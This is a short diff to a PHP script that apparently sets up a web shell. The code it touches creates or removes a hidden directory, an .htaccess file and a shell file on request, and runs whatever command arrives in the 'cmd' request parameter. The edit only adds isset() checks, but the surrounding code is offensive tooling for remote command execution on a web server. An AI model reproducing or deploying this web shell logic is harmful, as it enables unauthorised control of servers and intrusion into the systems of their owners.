@@ -98,13 +98,13 @@ $htaccess = "$dir/.htaccess";
 $shell = "$dir/$shell";
 $ext = pathinfo($shell, PATHINFO_EXTENSION);
 
-if ($_REQUEST['remove']) {
+if (isset($_REQUEST['remove'])) {
     remove_shell($shell);
     remove_htaccess($htaccess);
     remove_directory($dir);
 }
 
-if ($_REQUEST['create']) {
+if (isset($_REQUEST['create'])) {
     create_directory($dir);
     create_htaccess($htaccess, $ext);
     create_shell($shell);
@@ -112,7 +112,7 @@ if ($_REQUEST['create']) {
 
 display_shell($shell);
 
-if ($_REQUEST['cmd']) {
+if (isset($_REQUEST['cmd'])) {
     $cmd = $_REQUEST['cmd'];
     execute_command($shell, $cmd);
 }
